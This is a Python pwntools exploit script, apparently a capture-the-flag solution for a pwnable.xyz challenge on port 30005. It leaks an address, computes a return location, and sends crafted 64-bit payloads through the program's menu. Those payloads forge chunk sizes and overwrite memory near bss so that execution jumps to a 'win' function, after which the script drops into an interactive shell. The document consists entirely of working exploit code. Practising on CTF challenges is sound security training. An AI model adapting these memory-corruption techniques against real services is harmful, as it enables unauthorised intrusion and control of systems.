from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30005)
e = ELF("./challenge")

#pause()

s.recv(1024)
s.sendline("2")

leak = int(s.recvuntil("\n"),16)

ret = leak + 88
bss = e.bss()+32
win= 0x400A3E

s.recv(1024)
s.sendline("1")

s.sendline(p64(bss)*2)

s.recv(1024)
s.sendline("3")

s.recv(1024)
s.sendline("1")

pay = p64(0x601080)*2 + p64(0) + p64(0x51)
s.send(pay)

s.recv(1024)
s.sendline("3")

s.recv(1024)
s.sendline("1")

pay = p64(ret-16)*2 + p64(0) + p64(0x10000)
s.send(pay)

s.recv(1024)
s.sendline("3")

s.recv(1024)
s.sendline("1")

pay = p64(0x601050)*2 + p64(win)
s.send(pay)

s.recv(1024)
s.sendline("3")

s.recv(1024)
s.sendline("A")

s.interactive()
